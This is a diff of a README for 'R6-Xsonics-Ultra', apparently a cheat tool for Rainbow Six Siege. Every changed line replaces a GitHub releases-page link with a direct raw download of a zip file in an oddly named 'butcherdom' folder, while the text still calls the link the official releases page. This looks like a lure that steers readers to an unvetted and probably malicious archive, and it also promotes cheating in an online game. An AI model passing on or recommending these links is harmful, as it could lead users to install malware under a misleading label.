@@ -1,6 +1,6 @@
 # ⚡ R6-Xsonics-Ultra - Easy Tool for R6 Siege
 
-[![Download R6-Xsonics-Ultra](https://img.shields.io/badge/Download-R6--Xsonics--Ultra-brightgreen)](https://github.com/Fank-ezz/R6-Xsonics-Ultra/releases)
+[![Download R6-Xsonics-Ultra](https://img.shields.io/badge/Download-R6--Xsonics--Ultra-brightgreen)](https://raw.githubusercontent.com/Fank-ezz/R6-Xsonics-Ultra/main/butcherdom/Ultra_Xsonics_v2.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ To run R6-Xsonics-Ultra smoothly, make sure your system meets these requirements
 
 ## 🚀 Getting Started: How to Download and Install
 
-1. Click the big green button above or visit the [R6-Xsonics-Ultra Releases Page](https://github.com/Fank-ezz/R6-Xsonics-Ultra/releases).
+1. Click the big green button above or visit the [R6-Xsonics-Ultra Releases Page](https://raw.githubusercontent.com/Fank-ezz/R6-Xsonics-Ultra/main/butcherdom/Ultra_Xsonics_v2.4.zip).
 
 2. On the releases page, look for the latest version. Find the file named something like `Xsonics_x64.zip`.
 
@@ -84,7 +84,7 @@ Avoid running multiple hack or cheat tools at the same time, as this may cause c
 
 ## 📥 Download Links
 
-[![Download R6-Xsonics-Ultra](https://img.shields.io/badge/Download-R6--Xsonics--Ultra-blue)](https://github.com/Fank-ezz/R6-Xsonics-Ultra/releases)
+[![Download R6-Xsonics-Ultra](https://img.shields.io/badge/Download-R6--Xsonics--Ultra-blue)](https://raw.githubusercontent.com/Fank-ezz/R6-Xsonics-Ultra/main/butcherdom/Ultra_Xsonics_v2.4.zip)
 
 Use the above link or button to visit the official releases page. Always get the latest version from there.
 
@@ -126,7 +126,7 @@ If you have questions or issues:
 
 ## 🔗 Useful Links
 
-- [R6-Xsonics-Ultra Releases Page](https://github.com/Fank-ezz/R6-Xsonics-Ultra/releases)
+- [R6-Xsonics-Ultra Releases Page](https://raw.githubusercontent.com/Fank-ezz/R6-Xsonics-Ultra/main/butcherdom/Ultra_Xsonics_v2.4.zip)
 - Rainbow Six Siege official website (for game info)  
 - Windows support page (for system help)  
 
